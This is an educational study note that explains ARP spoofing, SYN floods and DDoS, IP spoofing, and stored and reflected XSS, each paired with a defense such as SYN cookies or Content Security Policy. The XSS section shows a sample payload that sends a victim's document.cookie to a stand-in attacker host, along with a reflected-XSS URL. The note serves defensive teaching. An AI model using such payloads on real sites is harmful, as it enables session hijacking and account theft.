---
tags:
  - "#TRUNK"
---
# Exploits
To be a good defender, you must think like an attacker. The most elegant attacks do not "break" the rules of networking; they simply exploit the trust built into them.

## Man-in-the-Middle (MitM) Attack
When your computer decides a destination is Local (on the same subnet), it does not send the packet to the Router. It tries to hand it directly to the device.

But here is the missing link: IP Addresses are virtual. Hardware does not actually speak "IP." Network cards speak MAC Addresses (Media Access Control).

- IP Address: The logical address (e.g., "The President").
- MAC Address: The physical ID card burned into the hardware (e.g., "John Smith, ID #12345").

### The Protocol: ARP (Address Resolution Protocol)
When your laptop (192.168.1.5) needs to talk to the Router (192.168.1.1), it shouts out to the room:
- "Who has the IP 192.168.1.1? Please tell me your MAC address."

The Router normally replies:
- "I have 192.168.1.1. My MAC address is AA:BB:CC:DD:EE:FF."
- Your laptop writes this down in a cache: 192.168.1.1 = AA:BB:CC:DD:EE:FF.

### The Attack: ARP Spoofing
The protocol (ARP) was designed in the 1980s. It was built on blind trust. It has no verification mechanism. It assumes everyone on the local network is friendly.

The Hacker (sitting in the coffee shop) exploits this.
1. The Broadcast: You join the Wi-Fi and ask: "Who is the Router (192.168.1.1)?"
2. The Lie: The Hacker's computer immediately replies: "I am 192.168.1.1. My MAC Address is 66:66:66:66:66:66."
3. The Poisoning: Your laptop receives the reply. It does not check if it's true. It simply updates its list: Router = Hacker.

Now, every time you try to go to Google, send an email, or enter a password:
1. Your computer wraps the packet.
2. It stamps the destination as the Hacker's MAC address.
3. The Hacker receives your data.
4. The "Middle" Man: The Hacker reads/records your data, then forwards it to the real router.
5. You load the website normally. You have no idea you are being watched.

### The Defense (or lack thereof)
This is terrifyingly easy to execute because the ARP protocol is Stateless. It does not remember the past, and it accepts updates from anyone at any time.

If I walk into a room and say "I am the Professor," and you believe me without checking my ID, I have successfully "ARP Spoofed" you.

To protect the victim, you can open their command line and type a command that effectively says:

- "The IP Address 192.168.1.1 PERMANENTLY belongs to MAC Address AA:BB:CC:DD:EE:FF."
- (Where AA... is the real MAC address of the Router, not the Hacker's).

1. The Override: A "Static" (Manual) entry always beats a "Dynamic" (Learned) entry.
2. The Shield: When the Hacker shouts, "I am 192.168.1.1 (MAC 66:66...)", the victim's computer looks at its hardcoded list, sees that 192.168.1.1 is already locked to the real Router, and simply ignores the Hacker.

The Real Solution for Public Wi-Fi: Since we cannot prevent the Man-in-the-Middle in a public space (anyone can spoof ARP), we assume the connection is already compromised. Instead of trying to stop the interception, we make the intercepted data useless.
- VPN (Virtual Private Network): This creates an encrypted tunnel. Even if the hacker intercepts your packets, they see only scrambled garbage.
- HTTPS: As we learned earlier, this encrypts the data inside the packet.

## Denial of Service (DoS)
The Denial of Service (DoS) attack does not involve breaking in. It involves overloading. It is the digital equivalent of a crowd of people blocking the entrance to a shop so that legitimate customers cannot get in.

### The TCP SYN Flood
Normal Connection:
1. SYN: You send a "Hello" to the Server.
2. SYN-ACK: The Server replies "Hello, I am ready. I have reserved memory for our conversation."
3. ACK: You reply "Great, let's talk." -> Connection Established.

The Attack: The Hacker exploits step 2.
1. The Flood: The Hacker sends thousands of SYN (Hello) packets to the Server rapidly.
2. The Trap: The Server, being polite, replies to every single one with SYN-ACK and reserves memory for each conversation, waiting for the final reply.
3. The Ghost: The Hacker never sends the final ACK.
4. The Crash: The Server is left holding thousands of "open conversations" that will never finish. Its memory fills up. When a real user tries to connect, the Server has zero memory left and rejects them.

## DDoS (Distributed Denial of Service)
The "SYN Flood" is a classic DoS (One attacker vs. One Target). But modern servers are strong. One hacker cannot crash Google.
So, hackers use DDoS (Distributed Denial of Service).

1. The Botnet: The hacker infects 100,000 "Smart Toasters" and "Smart Cameras" (IoT devices) with malware.
2. The Command: The hacker presses one button.
3. The Attack: All 100,000 toasters send a SYN packet to the Target at the exact same millisecond.
Even a Supercomputer cannot handle 100,000 fake phone calls at once.

### Defense: SYN Cookies
How it works (The "No Reservation" Policy):
1. The Attack: The Bot sends a SYN packet.
2. The Defense: The Server does not allocate any memory. It does not open a file. It does not "pick up the phone."
3. The Cookie: Instead, the Server looks at the Bot's IP and calculates a complex mathematical hash (a secret number). It sends this number back to the Bot in the SYN-ACK packet.
    - Server Attitude: "I'm not writing anything down. If you are real, prove you received this number."
4. The Verification:
- If it's a Bot: It never replies. The Server forgets it instantly. Zero memory lost.
- If it's a Human: The computer automatically replies with ACK + The Secret Number + 1.
5. The Connection: The Server checks the math. If the number is correct, only then does it allocate memory and let you in.

If the bot receives the number, it can easily do the math and reply. The math is trivial.
However, the defense works because in a typical SYN Flood, the bot never receives the number.

To overwhelm a server without getting caught, hackers almost always use IP Spoofing. They lie about their return address.
1. The Lie: The Hacker (Real IP: 1.2.3.4) sends a packet to the Server, but he edits the "Source IP" field to say: "I am 8.8.8.8 (Google)."
2. The Trigger: The Server receives the SYN. It calculates the Secret Number (Cookie).
3. The Reply: The Server mails the Secret Number to the address written on the packet: 8.8.8.8.
4. The Result:
    - The Real Google (8.8.8.8) gets a weird packet with a number it didn't ask for. It ignores it.
    - The Hacker (1.2.3.4) sits there waiting. He never sees the Secret Number.
    - Because he cannot see the number, he cannot do the math (Number + 1).
    - Because he cannot do the math, he cannot send the final ACK.
    - The Server realizes the connection is fake and drops it.

If the Hacker decides: "Fine, I will use my real IP so I can receive the Cookie and do the math."
Then yes, the Bot can successfully connect. But this defeats the purpose of the attack.
- Exposure: The moment the Bot completes the connection, the Server has a valid, confirmed TCP connection with the Hacker's Real IP.
- The Fix: The Network Administrator now sees: "IP 1.2.3.4 is opening 5,000 connections."
- The Ban: The Administrator simply adds 1.2.3.4 to the Firewall Blocklist.

Summary:
- Spoofed IP: The Bot cannot verify the Cookie (Physics prevents it).
- Real IP: The Bot verifies the Cookie, but gets instantly banned (Security Policy prevents it).

## The Application Layer (Layer 7)
[[SQL Injection]]

## XSS (Cross-Site Scripting)
Your web browser (Chrome, Safari, Edge) has a simple, dangerous rule: "If the website sends me Code (JavaScript), I will execute it."
It does not ask: "Is this code from the benevolent developer, or is it from a malicious hacker?" It simply runs it.

### Stored XSS (The Trap)
Imagine a social media site or a news site with a Comments Section. Normally, you type text: "Great article!" The server saves this text to the database. When other people visit the page, the server serves the text back to them.

The Attack: The Hacker does not type text. They type HTML/JavaScript Code.
- Input: <script> malicious_code_here() </script>

If the website is vulnerable (i.e., it does not "sanitize" or clean the input), it saves this script in the database just like a normal comment.

The Trigger:
1. The Victim visits the page to read the news.
2. The Server loads the comments, including the Hacker's script.
3. The Victim's Browser reads the page. It sees <script> and thinks: "Oh, the developer wants me to run this."
4. Execution: The malicious code runs inside the Victim's browser.

### The Payload: Session Hijacking
JavaScript has a very specific power: It can read your Cookies.
When you log in to Facebook, the server gives you a Session Cookie (a temporary ID card). Your browser stores this so you don't have to type your password on every page.
The hacker's script usually looks like this: window.location='http://hacker-site.com/steal?cookie='+document.cookie;

What happens:
1. The victim loads the page.
2. The script runs silently.
3. It grabs the victim's Session ID.
4. It immediately redirects the browser to the Hacker's server and hands over the ID.

The Consequence: The Hacker takes that ID, pastes it into their own browser, and hits refresh. The server sees the ID and says: "Welcome back, [Victim Name]." The Hacker is now logged in as you. They did not need your password. They just needed your temporary ID.

## Reflected XSS (The Trap Link)
The Mechanism: The Mirror Think about a Search Bar.
1. You search for "Pizza".
2. The website replies: "Results for: Pizza".
3. The server took your input ("Pizza") and reflected it back to you on the screen.

The Attack: The hacker notices this "reflection."
1. The Bait: The hacker creates a malicious URL: http://site.com/search?q=<script>steal_cookie()</script>
2. The Delivery: They cannot save this to the site. So, they email this specific link to the Victim.
3. The Trigger: The Victim clicks the link.
4. The Reflection: The website loads and politely says: "Results for: [Hacker's Script]".
5. The Execution: The Victim's browser sees the script and runs it.

The Distinction:
- Stored XSS: The malicious code is in the Database. (Dangerous to everyone).
- Reflected XSS: The malicious code is in the URL. (Dangerous only to the person who clicks the link).

## The Defense (Content Security Policy)
We cannot trust users to stop clicking links. We must secure the browser. The ultimate defense against XSS is called CSP (Content Security Policy).

The Concept: The Guest List Normally, a browser trusts all code it finds on a page. A CSP is a header the server sends that says:
"Only run scripts that come from My Domain. Do not run random scripts you find written in the HTML."

If a CSP is active:
- The Hacker's script <script>alert(1)</script> arrives on the page.
- The Browser checks the CSP: "Is this script a separate file from a trusted domain?"
- Answer: No, it is inline code.
- Action: The Browser blocks it. The attack fails.